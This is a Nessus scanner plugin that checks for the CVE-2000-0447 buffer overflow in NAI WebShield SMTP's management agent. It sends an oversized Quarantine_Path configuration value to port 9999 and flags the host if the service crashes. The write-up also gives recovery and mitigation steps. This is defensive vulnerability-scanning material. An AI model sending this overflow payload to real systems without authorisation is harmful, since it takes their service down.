#
# Written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Script License for details.
#
if(description)
{
  script_id(10425);
  script_bugtraq_id(1254);
 script_version ("$Revision: 1.13 $");
  script_cve_id("CVE-2000-0447");
  name["english"] = "NAI Management Agent overflow";
  script_name(english:name["english"]);

  desc["english"] = "
The remote NAI WebShield SMTP Management tool
is vulnerable to a buffer overflow which allows
an attacker to gain execute arbitrary code
on this host when it is issued a too long argument
as a configuration parameter.

In addition to this, it allows an attacker to disable
the service at will.

* To re-enable the service :

	- execute regedit
	- edit the registry key 'Quarantine_Path' under
		HKLM\SOFTWARE\Network Associates\TVD\WebShield SMTP\MailScan	
	- change its value from 'XXX...XXX' to the valid path to
	   the quarantine folder.
	- restart the service  	

Solution : filter incoming traffic to this port. You
may also restrict the set of trusted hosts in the
configuration console :
	- go to the 'server' section
	- select the 'trusted clients' tab
	- and set the data accordingly

Risk factor : High";	

 script_description(english:desc["english"]);

 summary["english"] = "Determines if the remote NAI WebShield SMTP Management trusts us"; 
 script_summary(english:summary["english"]);

 script_category(ACT_DESTRUCTIVE_ATTACK);
 family["english"] = "Gain a shell remotely";
 family["francais"] = "Obtenir un shell à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "nai_webshield_info.nasl");
 script_require_ports(9999);
 script_require_keys("nai_webshield_management_agent/available");
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 exit(0);
}

#
# The script code starts here
#

port = 9999;
if(get_port_state(port))
{
   soc = open_sock_tcp(port);
   if(soc)
   {
     req = string("GET_CONFIG\r\n");
     send(socket:soc, data:req);
     r = recv(socket:soc, length:2048);
     if ( ! r ) exit(0);
     close(soc);

     soc = open_sock_tcp(port);
     if ( ! soc ) exit(0);

     req = string("SET_CONFIG\r\nQuarantine_Path='", crap(3000), "'\r\n\r\n");
     send(socket:soc, data:req);
     r = recv(socket:soc, length:2048);
     if ( ! r ) exit(0);
     close(soc);
     sleep(2);
     
     soc2 = open_sock_tcp(port);
     if(!soc2)
     {
       security_hole(port);
     }
     else
     {
      req = string("GET_CONFIG\r\n");
      send(socket:soc2, data:req);
      r2 = recv(socket:soc2, length:1024);
      close(soc2);
      if(!r2)security_hole(port);
      }
   }
}
